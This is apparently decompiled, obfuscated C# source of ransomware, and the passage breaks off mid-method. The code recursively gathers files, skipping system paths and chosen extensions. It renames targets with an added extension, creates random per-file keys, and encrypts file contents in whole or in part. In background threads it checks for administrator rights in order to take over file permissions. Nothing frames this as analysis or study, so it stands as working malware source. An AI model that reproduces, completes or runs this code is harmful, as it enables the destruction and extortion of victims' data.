using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using XucgddUxXfI;
using tEkZemnspFoCzB;

namespace ovnaSovhORzB;

internal sealed class EEGkMyyVIDL
{
	public sealed class AwqBWeKIscu
	{
		private static StringCollection tykKFHLGvYv;

		private static List<string> NOytCZELXBcy;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107477749));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107477776)) && !text.ToLower().Contains(getString_0(107477723)) && !text.ToLower().Contains(getString_0(107367918)) && !text.ToLower().Contains(getString_0(107367873)) && !text.ToLower().Contains(getString_0(107477742)) && !text.ToLower().Contains(getString_0(107367245)) && !text.ToLower().Contains(getString_0(107367186)) && !text.ToLower().Contains(getString_0(107367137)) && !text.ToLower().Contains(getString_0(107367152)) && !text.ToLower().Contains(getString_0(107367103)) && !text.ToLower().Contains(getString_0(107367069)) && !text.ToLower().Contains(getString_0(107367084)) && !text.ToLower().Contains(getString_0(107367035)) && !text.ToLower().Contains(getString_0(107367054)) && !text.ToLower().Contains(getString_0(107367513)) && !text.ToLower().Contains(getString_0(107367532)) && !text.ToLower().Contains(getString_0(107367487)) && !text.ToLower().Contains(getString_0(107367502)) && !text.ToLower().Contains(getString_0(107367453)) && !text.Contains(DRlXtEGdcAr(getString_0(107367468))) && !text.Contains(getString_0(107367443)) && !text.Contains(getString_0(107367381)) && !text.EndsWith(getString_0(107412054)) && !text.EndsWith(getString_0(107367356)) && !text.EndsWith(getString_0(107367351)) && !text.EndsWith(getString_0(107367378)) && !text.EndsWith(getString_0(107367373)) && !text.ToLower().Contains(getString_0(107367368)) && !text.ToLower().Contains(eUsvqxZnDWYVdQ))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(UZIiquGHnbBZH) * 1024.0 * 1024.0 && vwwbhwOABO == getString_0(107396730))
							{
								NOytCZELXBcy.Add(text);
							}
							else if (File.Exists(text) && vwwbhwOABO == getString_0(107397159))
							{
								NOytCZELXBcy.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return NOytCZELXBcy;
		}

		static AwqBWeKIscu()
		{
			Strings.CreateGetStringDelegate(typeof(AwqBWeKIscu));
			tykKFHLGvYv = new StringCollection();
			NOytCZELXBcy = new List<string>();
		}
	}

	private sealed class VAtvyvEdeDhiTYl
	{
		public string QqjPMSAEacSfmu;

		public bool _003CMain_003Eb__5(Process process_0)
		{
			return process_0.ProcessName == QqjPMSAEacSfmu;
		}
	}

	private sealed class CNuQcpTYjrLDCL
	{
		public string CsXsTwSZWKw;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CMapDrv_003Eb__19(int int_0)
		{
			Thread.Sleep(rrxeEOhCBbfFLgvV);
			vjXOwyOsZFHuY.Add(getString_0(107366757) + CsXsTwSZWKw + getString_0(107397167) + (char)int_0 + getString_0(107477696));
			try
			{
				if (IrtcteVbDJMbKD)
				{
					Console.WriteLine(getString_0(107366757) + CsXsTwSZWKw + getString_0(107397167) + (char)int_0 + getString_0(107477696));
				}
			}
			catch
			{
			}
		}

		static CNuQcpTYjrLDCL()
		{
			Strings.CreateGetStringDelegate(typeof(CNuQcpTYjrLDCL));
		}
	}

	private sealed class vXvytLZhsEJ
	{
		public string vmEzHwsOBXJew;

		public bool _003CIsDriveNTFS_003Eb__1e(DriveInfo driveInfo_0)
		{
			return driveInfo_0.RootDirectory.Name == vmEzHwsOBXJew;
		}
	}

	private sealed class KMJjgTaGyGoI
	{
		private sealed class gzJfwJMzEav
		{
			public KMJjgTaGyGoI klsDNztoYXkfr;

			public string wxjjxOOOHenrc;

			public void _003CCrypt_003Eb__28()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					sdtISqUteMHp(WindowsIdentity.GetCurrent().Name, wxjjxOOOHenrc);
				}
			}

			public void _003CCrypt_003Eb__29()
			{
				OQIlzgdLGaTrUDu(wxjjxOOOHenrc, klsDNztoYXkfr.FNIjUNNqXwdHj, klsDNztoYXkfr.qBauyXNikmMNt, klsDNztoYXkfr.IqyilbKzVoAwTbE, klsDNztoYXkfr.nYKOUovRNfx);
			}
		}

		public string[] FNIjUNNqXwdHj;

		public string[] IqyilbKzVoAwTbE;

		public string nYKOUovRNfx;

		public string qBauyXNikmMNt;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__27(string string_0)
		{
			gzJfwJMzEav CS_0024_003C_003E8__locals0 = new gzJfwJMzEav();
			CS_0024_003C_003E8__locals0.klsDNztoYXkfr = this;
			CS_0024_003C_003E8__locals0.wxjjxOOOHenrc = string_0;
			if (cgnsxMDVCroTQ && !MobVTSLPgWz().Contains(getString_0(107462122)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						sdtISqUteMHp(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.wxjjxOOOHenrc);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (uUqSvzVKAfyGAz == getString_0(107396739))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					OQIlzgdLGaTrUDu(CS_0024_003C_003E8__locals0.wxjjxOOOHenrc, CS_0024_003C_003E8__locals0.klsDNztoYXkfr.FNIjUNNqXwdHj, CS_0024_003C_003E8__locals0.klsDNztoYXkfr.qBauyXNikmMNt, CS_0024_003C_003E8__locals0.klsDNztoYXkfr.IqyilbKzVoAwTbE, CS_0024_003C_003E8__locals0.klsDNztoYXkfr.nYKOUovRNfx);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				OQIlzgdLGaTrUDu(CS_0024_003C_003E8__locals0.wxjjxOOOHenrc, FNIjUNNqXwdHj, qBauyXNikmMNt, IqyilbKzVoAwTbE, nYKOUovRNfx);
			}
		}

		static KMJjgTaGyGoI()
		{
			Strings.CreateGetStringDelegate(typeof(KMJjgTaGyGoI));
		}
	}

	private sealed class cjHnGtYwZMHzv
	{
		private sealed class XCwtJHOLhgj
		{
			public cjHnGtYwZMHzv QUdXahSqDeWDNP;

			public string wxEAiIcvfnmJwqp;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__35()
			{
				foreach (string item in chWKKaOgedu)
				{
					if (wxEAiIcvfnmJwqp.ToLower().EndsWith(item + QUdXahSqDeWDNP.YZBBEXJSEfzFSqOL) && fWqlqykUBEVkds == getString_0(107396750))
					{
						if (Convert.ToInt32(wQqHVBAZmaYqT) * 1024 * 1024 > new FileInfo(wxEAiIcvfnmJwqp).Length)
						{
							try
							{
								XCKLADindvJZ.nhXRXZDxbmMGwhokOT(getString_0(107368561), getString_0(107368556), getString_0(107368575), wxEAiIcvfnmJwqp);
							}
							catch
							{
							}
						}
					}
					else if (wxEAiIcvfnmJwqp.ToLower().EndsWith(item) && fWqlqykUBEVkds == getString_0(107397179))
					{
						try
						{
							XCKLADindvJZ.nhXRXZDxbmMGwhokOT(getString_0(107368561), getString_0(107368556), getString_0(107368575), wxEAiIcvfnmJwqp);
						}
						catch
						{
						}
					}
				}
			}

			static XCwtJHOLhgj()
			{
				Strings.CreateGetStringDelegate(typeof(XCwtJHOLhgj));
			}
		}

		private sealed class ZXZgprhWxBP
		{
			public cjHnGtYwZMHzv QUdXahSqDeWDNP;

			public string jHcqeHIPeN;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__37()
			{
				foreach (string item in chWKKaOgedu)
				{
					if (jHcqeHIPeN.ToLower().EndsWith(item + QUdXahSqDeWDNP.YZBBEXJSEfzFSqOL) && fWqlqykUBEVkds == getString_0(107396753))
					{
						if (Convert.ToInt32(wQqHVBAZmaYqT) * 1024 * 1024 > new FileInfo(jHcqeHIPeN).Length)
						{
							try
							{
								XCKLADindvJZ.nhXRXZDxbmMGwhokOT(getString_0(107368564), getString_0(107368559), getString_0(107368578), jHcqeHIPeN);
							}
							catch
							{
							}
						}
					}
					else if (jHcqeHIPeN.ToLower().EndsWith(item) && fWqlqykUBEVkds == getString_0(107397182))
					{
						try
						{
							XCKLADindvJZ.nhXRXZDxbmMGwhokOT(getString_0(107368564), getString_0(107368559), getString_0(107368578), jHcqeHIPeN);
						}
						catch
						{
						}
					}
				}
			}

			static ZXZgprhWxBP()
			{
				Strings.CreateGetStringDelegate(typeof(ZXZgprhWxBP));
			}
		}

		public List<string> IBAyWgLdmIlSINF;

		public List<string> GNntzJbksCJrMo;

		public string YZBBEXJSEfzFSqOL;

		public string[] KvZqhnomFkqLeM;

		public string UOfCooZEtXM;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__34(string string_0)
		{
			XCwtJHOLhgj CS_0024_003C_003E8__locals0;
			foreach (string item in GNntzJbksCJrMo)
			{
				if (item.Contains(getString_0(107367978)) || item.Contains(getString_0(107367953)) || item.Contains(getString_0(107367920)) || item.ToLower().Contains(getString_0(107367935)) || item.ToLower().Contains(getString_0(107367890)) || item.Contains(getString_0(107367897)) || item.Contains(getString_0(107367876)) || item.ToLower().Contains(getString_0(107367863)) || item.ToLower().Contains(getString_0(107367818)) || item.ToLower().Contains(getString_0(107367269)) || item.ToLower().Contains(getString_0(107367292)) || item.ToLower().Contains(getString_0(107367243)) || item.ToLower().Contains(getString_0(107367217)) || item.ToLower().Contains(getString_0(107367228)) || item.Contains(getString_0(107367203)) || item.Contains(getString_0(107367154)) || item.Contains(getString_0(107367169)) || item.Contains(getString_0(107367120)) || item.Contains(getString_0(107367135)) || item.Contains(getString_0(107367086)) || item.Contains(getString_0(107367101)) || item.Contains(getString_0(107367052)) || item.Contains(getString_0(107367071)) || item.Contains(getString_0(107367530)) || item.ToLower().Contains(getString_0(107367549)) || item.ToLower().Contains(getString_0(107367504)) || item.ToLower().Contains(getString_0(107367519)) || item.ToLower().Contains(getString_0(107367470)) || item.Contains(DRlXtEGdcAr(getString_0(107367485))) || item.Contains(getString_0(107367460)) || item.Contains(getString_0(107367447)) || item.Contains(getString_0(107367398)) || item.EndsWith(YZBBEXJSEfzFSqOL) || item.EndsWith(getString_0(107367373)) || item.EndsWith(getString_0(107367368)) || item.EndsWith(getString_0(107367395)) || item.EndsWith(getString_0(107367390)) || item.Contains(getString_0(107367385)) || item.Contains(eUsvqxZnDWYVdQ) || item.Contains(GqXvKuGfqke) || item.Contains(TajfgxbHDQDsSZ))
				{
					continue;
				}
				if (KvZqhnomFkqLeM.Length != 0)
				{
					string[] kvZqhnomFkqLeM = KvZqhnomFkqLeM;
					int num = 0;
					while (num < kvZqhnomFkqLeM.Length)
					{
						string value = kvZqhnomFkqLeM[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0e2a;
					}
				}
				try
				{
					if (item.EndsWith(YZBBEXJSEfzFSqOL))
					{
						goto IL_0e2a;
					}
				}
				catch (Exception)
				{
					goto IL_0e2a;
				}
				if (!item.EndsWith(string_0) || UdjWdPcrsN.Contains(item))
				{
					continue;
				}
				if (xfkNWisgyvAPU == getString_0(107396747))
				{
					try
					{
						if (WYJTdIPbblX.TSIXTbBLjVAFJe(item))
						{
							WYJTdIPbblX.miTLgtFrOVP(item);
						}
					}
					catch
					{
					}
				}
				UdjWdPcrsN.Add(item);
				if (!nfYRZbrPjpWWw.Contains(Path.GetDirectoryName(item)))
				{
					nfYRZbrPjpWWw.Add(Path.GetDirectoryName(item));
				}
				zUUGKqROIrsY(item);
				try
				{
					new SsmQVyeqVMhAq().kXwlygCLUp(item);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (IrtcteVbDJMbKD)
							{
								Console.WriteLine(getString_0(107477705) + item + getString_0(107477692) + new FileInfo(item).Length + getString_0(107477639));
								Console.WriteLine(getString_0(107477662));
							}
						}
						catch
						{
						}
						VKiZFXRXdSmDy(DRlXtEGdcAr(getString_0(107478069)), getString_0(107366757) + item + getString_0(107366757) + DRlXtEGdcAr(getString_0(107478044)) + getString_0(107366757) + Environment.UserName + getString_0(107366757) + DRlXtEGdcAr(getString_0(107477995)));
					}
				}
				catch (Exception ex2)
				{
					if (qphnWLJhmOUolrV)
					{
						try
						{
							File.AppendAllText(GqXvKuGfqke, getString_0(107461784) + item + getString_0(107477970) + ex2.Message + getString_0(107396430));
						}
						catch (Exception)
						{
						}
					}
					continue;
				}
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex4)
					{
						if (qphnWLJhmOUolrV)
						{
							try
							{
								File.AppendAllText(GqXvKuGfqke, getString_0(107461784) + item + getString_0(107477921) + ex4.Message + getString_0(107396430));
							}
							catch (Exception)
							{
							}
						}
						CfPnwVRgYaXy++;
						goto end_IL_0716;
					}
					if (tiRzeTZfFqxZgzU == getString_0(107396747) && new FileInfo(item).Length > Convert.ToInt32(WsRteVdKTkKpED) * 1024 * 1024 && !IBAyWgLdmIlSINF.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new XCwtJHOLhgj();
						CS_0024_003C_003E8__locals0.QUdXahSqDeWDNP = this;
						try
						{
							if (YZBBEXJSEfzFSqOL != getString_0(107462022))
							{
								if (JaGTzvkqDZS)
								{
									YZBBEXJSEfzFSqOL = WorQZGhMrwJuixubIO + YZBBEXJSEfzFSqOL;
								}
								File.Move(item, item + YZBBEXJSEfzFSqOL);
							}
						}
						catch (Exception ex6)
						{
							if (qphnWLJhmOUolrV)
							{
								try
								{
									File.AppendAllText(GqXvKuGfqke, getString_0(107461784) + item + getString_0(107477348) + ex6.Message + getString_0(107396430));
								}
								catch (Exception)
								{
								}
							}
							CfPnwVRgYaXy++;
							goto end_IL_0716;
						}
						CS_0024_003C_003E8__locals0.wxEAiIcvfnmJwqp = getString_0(107368509);
						if (YZBBEXJSEfzFSqOL != getString_0(107462022))
						{
							CS_0024_003C_003E8__locals0.wxEAiIcvfnmJwqp = item + YZBBEXJSEfzFSqOL;
						}
						else
						{
							CS_0024_003C_003E8__locals0.wxEAiIcvfnmJwqp = item;
						}
						if (NgNETKMlSjJng == getString_0(107396747))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in chWKKaOgedu)
								{
									if (CS_0024_003C_003E8__locals0.wxEAiIcvfnmJwqp.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.QUdXahSqDeWDNP.YZBBEXJSEfzFSqOL) && fWqlqykUBEVkds == XCwtJHOLhgj.getString_0(107396750))
									{
										if (Convert.ToInt32(wQqHVBAZmaYqT) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.wxEAiIcvfnmJwqp).Length)
										{
											try
											{
												XCKLADindvJZ.nhXRXZDxbmMGwhokOT(XCwtJHOLhgj.getString_0(107368561), XCwtJHOLhgj.getString_0(107368556), XCwtJHOLhgj.getString_0(107368575), CS_0024_003C_003E8__locals0.wxEAiIcvfnmJwqp);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.wxEAiIcvfnmJwqp.ToLower().EndsWith(item2) && fWqlqykUBEVkds == XCwtJHOLhgj.getString_0(107397179))
									{
										try
										{
											XCKLADindvJZ.nhXRXZDxbmMGwhokOT(XCwtJHOLhgj.getString_0(107368561), XCwtJHOLhgj.getString_0(107368556), XCwtJHOLhgj.getString_0(107368575), CS_0024_003C_003E8__locals0.wxEAiIcvfnmJwqp);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = SznTIlYhfLTN.eXlzrfSfGzN(32);
						string s = YYqwPFDAXdJ.cKyevcNdVhPKbErXE(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (dVeczuFsmFhaWQ == getString_0(107397176))
						{
							byte[] array = null;
							byte[] byte_ = YkOjxnmurVCfbj.QfkbKHDJftu(CS_0024_003C_003E8__locals0.wxEAiIcvfnmJwqp, Convert.ToInt32(WsRteVdKTkKpED) * 1024 * 1024);
							if (YkOjxnmurVCfbj.QNMHgTJICNuFwEj(aZxQiYswrzEMHo: (!xIEYdRogbJjk) ? (DfXjMyctTQk ? YkOjxnmurVCfbj.WsadWEYMhPkNa(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : YkOjxnmurVCfbj.WsadWEYMhPkNa(byte_, Encoding.ASCII.GetBytes(UOfCooZEtXM), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (DfXjMyctTQk ? NVikUgaKetXUZt.GbzVpJVLoYrET(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : NVikUgaKetXUZt.GbzVpJVLoYrET(byte_, Encoding.ASCII.GetBytes(UOfCooZEtXM), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), qtBBAGkzVvLoDw: CS_0024_003C_003E8__locals0.wxEAiIcvfnmJwqp, BPtIRqUKxRmcJT: bytes))
							{
								goto IL_0e2a;
							}
							try
							{
								File.Move(item + YZBBEXJSEfzFSqOL, item);
							}
							catch (Exception)
							{
							}
						}
						else if (!DfXjMyctTQk)
						{
							if (KEPDVlpbgsoad.kCRjVccpOKvz(CS_0024_003C_003E8__locals0.wxEAiIcvfnmJwqp, WsRteVdKTkKpED, UOfCooZEtXM))
							{
								goto IL_0e2a;
							}
							try
							{
								File.Move(item + YZBBEXJSEfzFSqOL, item);
							}
							catch (Exception)
							{
							}
						}
						else
						{
							if (KEPDVlpbgsoad.kCRjVccpOKvz(CS_0024_003C_003E8__locals0.wxEAiIcvfnmJwqp, WsRteVdKTkKpED, text, bytes))
							{
								goto IL_0e2a;
							}
							try
							{
								File.Move(item + YZBBEXJSEfzFSqOL, item);
							}
							catch (Exception)
							{
							}
						}
						continue;
					}
					if (JaGTzvkqDZS)
					{
						YZBBEXJSEfzFSqOL = WorQZGhMrwJuixubIO + YZBBEXJSEfzFSqOL;
					}
					string text2 = SznTIlYhfLTN.eXlzrfSfGzN(32);
					string s2 = YYqwPFDAXdJ.cKyevcNdVhPKbErXE(text2);
					byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
					if (YZBBEXJSEfzFSqOL != getString_0(107462022))
					{
						if (!tEHYMAajqyQN)
						{
							if (!DfXjMyctTQk)
							{
								lnQkjKFYbeSHtD(item, item + YZBBEXJSEfzFSqOL, fDTUzhDlmgg);
							}
							else
							{
								lnQkjKFYbeSHtD(item, item + YZBBEXJSEfzFSqOL, Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!DfXjMyctTQk)
								{
									UaSzdRmAlgEilgQY(item, item + YZBBEXJSEfzFSqOL, fDTUzhDlmgg);
								}
								else
								{
									UaSzdRmAlgEilgQY(item, item + YZBBEXJSEfzFSqOL, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex11)
							{
								if (qphnWLJhmOUolrV)
								{
									try
									{
										File.AppendAllText(GqXvKuGfqke, getString_0(107461784) + item + getString_0(107462040) + ex11.Message + getString_0(107396430));
									}
									catch (Exception)
									{
									}
								}
								CfPnwVRgYaXy++;
								try
								{
									File.Move(item + YZBBEXJSEfzFSqOL, item);
								}
								catch (Exception)
								{
								}
								goto end_IL_0716;
							}
						}
					}
					else if (!tEHYMAajqyQN)
					{
						if (!DfXjMyctTQk)
						{
							lnQkjKFYbeSHtD(item, item + getString_0(107462049), fDTUzhDlmgg);
						}
						else
						{
							lnQkjKFYbeSHtD(item, item + getString_0(107462049), Encoding.ASCII.GetBytes(text2));
						}
					}
					else
					{
						try
						{
							if (!DfXjMyctTQk)
							{
								UaSzdRmAlgEilgQY(item, item, fDTUzhDlmgg);
							}
							else
							{
								UaSzdRmAlgEilgQY(item, item, Encoding.ASCII.GetBytes(text2));
							}
						}
						catch (Exception ex14)
						{
							if (qphnWLJhmOUolrV)
							{
								try
								{
									File.AppendAllText(GqXvKuGfqke, getString_0(107461784) + item + getString_0(107462040) + ex14.Message + getString_0(107396430));
								}
								catch (Exception)
								{
								}
							}
							CfPnwVRgYaXy++;
							goto end_IL_0716;
						}
					}
					if (DfXjMyctTQk)
					{
						if (YZBBEXJSEfzFSqOL != getString_0(107462022))
						{
							jIMiBnTvhHRYVy(item + YZBBEXJSEfzFSqOL, bytes2);
						}
						else
						{
							jIMiBnTvhHRYVy(item, bytes2);
						}
					}
					goto IL_0e2a;
					end_IL_0716:;
				}
				catch (Exception)
				{
					goto IL_0e2a;
				}
				continue;
				IL_0e2a:
				GNntzJbksCJrMo.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__36(string string_0)
		{
			ZXZgprhWxBP CS_0024_003C_003E8__locals0 = new ZXZgprhWxBP();
			CS_0024_003C_003E8__locals0.QUdXahSqDeWDNP = this;
			CS_0024_003C_003E8__locals0.jHcqeHIPeN = string_0;
			if (!CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(getString_0(107367978)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(getString_0(107367953)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(getString_0(107367920)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.ToLower().Contains(getString_0(107367935)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.ToLower().Contains(getString_0(107367890)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(getString_0(107367897)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(getString_0(107367876)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.ToLower().Contains(getString_0(107367863)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.ToLower().Contains(getString_0(107367818)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.ToLower().Contains(getString_0(107367269)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.ToLower().Contains(getString_0(107367292)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.ToLower().Contains(getString_0(107367243)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.ToLower().Contains(getString_0(107367217)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.ToLower().Contains(getString_0(107367228)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(getString_0(107367203)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(getString_0(107367154)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(getString_0(107367169)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(getString_0(107367120)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(getString_0(107367135)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(getString_0(107367086)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(getString_0(107367101)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(getString_0(107367052)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(getString_0(107367071)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(getString_0(107367530)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.ToLower().Contains(getString_0(107367549)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.ToLower().Contains(getString_0(107367504)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.ToLower().Contains(getString_0(107367519)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.ToLower().Contains(getString_0(107367470)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(DRlXtEGdcAr(getString_0(107367485))) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(getString_0(107367460)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(getString_0(107367447)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(getString_0(107367398)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.EndsWith(YZBBEXJSEfzFSqOL) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.EndsWith(getString_0(107367373)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.EndsWith(getString_0(107367368)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.EndsWith(getString_0(107367395)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.EndsWith(getString_0(107367390)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(getString_0(107367385)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(eUsvqxZnDWYVdQ) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(GqXvKuGfqke) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(TajfgxbHDQDsSZ))
			{
				if (KvZqhnomFkqLeM.Length != 0)
				{
					string[] kvZqhnomFkqLeM = KvZqhnomFkqLeM;
					int num = 0;
					while (num < kvZqhnomFkqLeM.Length)
					{
						string value = kvZqhnomFkqLeM[num];
						if (!CS_0024_003C_003E8__locals0.jHcqeHIPeN.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_1000;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals0.jHcqeHIPeN.EndsWith(YZBBEXJSEfzFSqOL))
					{
						goto IL_1000;
					}
				}
				catch (Exception)
				{
					goto IL_1000;
				}
				if (!UdjWdPcrsN.Contains(CS_0024_003C_003E8__locals0.jHcqeHIPeN))
				{
					if (xfkNWisgyvAPU == getString_0(107396747))
					{
						try
						{
							if (WYJTdIPbblX.TSIXTbBLjVAFJe(CS_0024_003C_003E8__locals0.jHcqeHIPeN))
							{
								WYJTdIPbblX.miTLgtFrOVP(CS_0024_003C_003E8__locals0.jHcqeHIPeN);
							}
						}
						catch
						{
						}
					}
					UdjWdPcrsN.Add(CS_0024_003C_003E8__locals0.jHcqeHIPeN);
					if (!nfYRZbrPjpWWw.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.jHcqeHIPeN)))
					{
						nfYRZbrPjpWWw.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.jHcqeHIPeN));
					}
					zUUGKqROIrsY(CS_0024_003C_003E8__locals0.jHcqeHIPeN);
					try
					{
						new SsmQVyeqVMhAq().kXwlygCLUp(CS_0024_003C_003E8__locals0.jHcqeHIPeN);
					}
					catch
					{
					}
					try
					{
						using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.jHcqeHIPeN, FileMode.Open, FileAccess.Write);
						if (!fileStream.CanWrite)
						{
							try
							{
								if (IrtcteVbDJMbKD)
								{
									Console.WriteLine(getString_0(107477705) + CS_0024_003C_003E8__locals0.jHcqeHIPeN + getString_0(107477692) + new FileInfo(CS_0024_003C_003E8__locals0.jHcqeHIPeN).Length + getString_0(107477639));
									Console.WriteLine(getString_0(107477662));
								}
							}
							catch
							{
							}
							VKiZFXRXdSmDy(DRlXtEGdcAr(getString_0(107478069)), getString_0(107366757) + CS_0024_003C_003E8__locals0.jHcqeHIPeN + getString_0(107366757) + DRlXtEGdcAr(getString_0(107478044)) + getString_0(107366757) + Environment.UserName + getString_0(107366757) + DRlXtEGdcAr(getString_0(107477995)));
						}
					}
					catch (Exception ex2)
					{
						if (qphnWLJhmOUolrV)
						{
							try
							{
								File.AppendAllText(GqXvKuGfqke, getString_0(107461784) + CS_0024_003C_003E8__locals0.jHcqeHIPeN + getString_0(107477970) + ex2.Message + getString_0(107396430));
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
						return;
					}
					try
					{
						try
						{
							if (new FileInfo(CS_0024_003C_003E8__locals0.jHcqeHIPeN).Length != 0L)
							{
								goto end_IL_085c;
							}
							goto end_IL_085c_2;
							end_IL_085c:;
						}
						catch (Exception ex4)
						{
							if (qphnWLJhmOUolrV)
							{
								try
								{
									File.AppendAllText(GqXvKuGfqke, getString_0(107461784) + CS_0024_003C_003E8__locals0.jHcqeHIPeN + getString_0(107477921) + ex4.Message + getString_0(107396430));
								}
								catch (Exception)
								{
								}
							}
							CfPnwVRgYaXy++;
							goto end_IL_085c_2;
						}
						if (tiRzeTZfFqxZgzU == getString_0(107396747) && new FileInfo(CS_0024_003C_003E8__locals0.jHcqeHIPeN).Length > Convert.ToInt32(WsRteVdKTkKpED) * 1024 * 1024)
						{
							try
							{
								if (YZBBEXJSEfzFSqOL != getString_0(107462022))
								{
									if (JaGTzvkqDZS)
									{
										YZBBEXJSEfzFSqOL = WorQZGhMrwJuixubIO + YZBBEXJSEfzFSqOL;
									}
									File.Move(CS_0024_003C_003E8__locals0.jHcqeHIPeN, CS_0024_003C_003E8__locals0.jHcqeHIPeN + YZBBEXJSEfzFSqOL);
								}
